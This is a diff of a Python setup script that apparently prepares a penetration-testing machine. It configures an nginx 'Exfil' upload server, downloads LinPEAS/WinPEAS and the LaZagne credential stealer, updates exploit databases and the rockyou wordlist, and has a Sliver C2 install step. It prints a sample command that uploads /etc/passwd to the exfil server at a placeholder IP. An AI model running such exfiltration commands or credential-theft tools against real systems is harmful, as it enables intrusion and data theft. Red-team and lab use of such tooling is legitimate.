@@ -24,7 +24,7 @@ def nginx_config():
 	os.system("sudo rm /etc/nginx/sites-enabled/default")
 	# Usage
 	print(colored("NGINX has been setup. To test the upload, try:","green"))
-	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt \n", "green"))
+	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt \n", "green"))
 
 
 def env_setup():
@@ -34,19 +34,6 @@ def env_setup():
 	# The SMB Server may need some massaging so we have it sharing the desired directory
 	#print(colored("Starting SMB Server", "blue"))
 	# os.system("impacket-smbserver -smb2support share $(pwd)")
-
-
-def go_install():
-	if os.path.exists(f'/usr/local/go'):
-		print(colored('GO already is installed at /usr/local/go, continuing...', 'green'))
-	else:
-		os.system('wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz')
-		os.system('sudo rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz')
-		os.system('export PATH=$PATH:/usr/local/go/bin') # This currently isn't working properly
-		os.system('source $HOME/.profile && go version')
-		print('Attempting to utilize GO to grab & install assetfinder now...\n')
-		os.system('go get -u github.com/tomnomnom/assetfinder')
-		print(colored('If we have gotten to here, this is a good sign....', 'yellow'))
 
 #Consider moving into environment setup
 def msfdb_init():
@@ -66,27 +53,26 @@ def neo4j_init():
 	os.system('sudo neo4j start')
 	print("Neo4j service initialized")
 
-#TODO: Do this better
-#TODO: Fix it so that the proper lower-level user owns the files
 
 # This whole PEAS mess needs to be fixed later
 def peas_download():
 	# For the time being - just scrub the PEAS directory and re-obtain
 	if os.path.exists(f"{dldir}/PEAS"):
 		#Lol, risky
-		os.system(f"sudo rm -rf {dldir}/PEAS")
+		os.system(f"rm -rf {dldir}/PEAS")
 		grab_peas()
 	else:
 		grab_peas()
 
 def grab_peas():
-	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/linpeas.sh'
-	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEAS.bat'
-	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe'
-	os.system(f"sudo mkdir {dldir}/PEAS")
-	os.system(f"sudo wget {linpeas_sh} -qO {dldir}/PEAS/linpeas.sh ; sudo chmod +x {dldir}/PEAS/linpeas.sh")
-	os.system(f"sudo wget {winpeas_bat} -qO {dldir}/PEAS/winpeas.bat")
-	os.system(f"sudo wget {winpeas_exe} -qO {dldir}/PEAS/winpeas.exe")
+	#I would like to eventually make the date regex, instead of hardcoded dates...
+	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20230108/linpeas.sh'
+	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20230108/winPEAS.bat'
+	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20230108/winPEASany.exe'
+	os.system(f"mkdir {dldir}/PEAS")
+	os.system(f"wget {linpeas_sh} -qO {dldir}/PEAS/linpeas.sh ; sudo chmod +x {dldir}/PEAS/linpeas.sh")
+	os.system(f"wget {winpeas_bat} -qO {dldir}/PEAS/winpeas.bat")
+	os.system(f"wget {winpeas_exe} -qO {dldir}/PEAS/winpeas.exe")
 
 
 def shell_creation():
@@ -160,32 +146,10 @@ def jon():
 ^^^^^^^^^^^`^^^^^^^^
 Ol' Jon, kickin' them rocks again	\n""")
 
-def tool_update():
-	def nmap_update():
-		print("Updating nmap script database\n")
-		os.system('sudo nmap --script-updatedb 1>/dev/null')
-		print(colored('nmap script database updated \n', 'green'))
-
-	def rockyou():
-		print("Checking if rockyou has been unzipped...")
-		if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
-			print("It hasn't been decompressed - decompressing now...\n")
-			os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
-		else:
-			print(colored("rockyou has already been unzipped \n", 'green'))
-			print(colored("Software & Tool updates have been completed!", 'green'))
-	print('Updating searchsploit DB....\n')
-	os.system('sudo searchsploit -u ')
-	print(colored("Finished searchsploit update", 'green'))
-	print("Updating locate DB...\n")
-	os.system('sudo updatedb')
-	print(colored("Finished locate DB update \n", 'green'))
-	nmap_update()
-	rockyou()
-	return True
 
 def tool_install():
 	os.chdir(f"{dldir}")
+	structure_setup()
 	####Temp method to grab lazagne and the old firefox decrypt for python2
 	lazagne_exe = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
 	os.system(f"sudo wget {lazagne_exe} -qO {dldir}/lazagne.exe")
@@ -221,6 +185,30 @@ def tool_install():
 	peas_download()
 	os.system(f"sudo ln -s {dldir}/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x {dldir}/nmapAutomator/nmapAutomator.sh")
 	print("tool_install() Completed")
+	return True
+
+def tool_update():
+	def nmap_update():
+		print("Updating nmap script database\n")
+		os.system('sudo nmap --script-updatedb 1>/dev/null')
+		print(colored('nmap script database updated \n', 'green'))
+
+	def rockyou():
+		print("Checking if rockyou has been unzipped...")
+		if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
+			print("It hasn't been decompressed - decompressing now...\n")
+			os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
+		else:
+			print(colored("rockyou has already been unzipped \n", 'green'))
+			print(colored("Software & Tool updates have been completed!", 'green'))
+	print('Updating searchsploit DB....\n')
+	os.system('sudo searchsploit -u ')
+	print(colored("Finished searchsploit update", 'green'))
+	print("Updating locate DB...\n")
+	os.system('sudo updatedb')
+	print(colored("Finished locate DB update \n", 'green'))
+	nmap_update()
+	rockyou()
 	return True
 
 def c2_sliver_install():
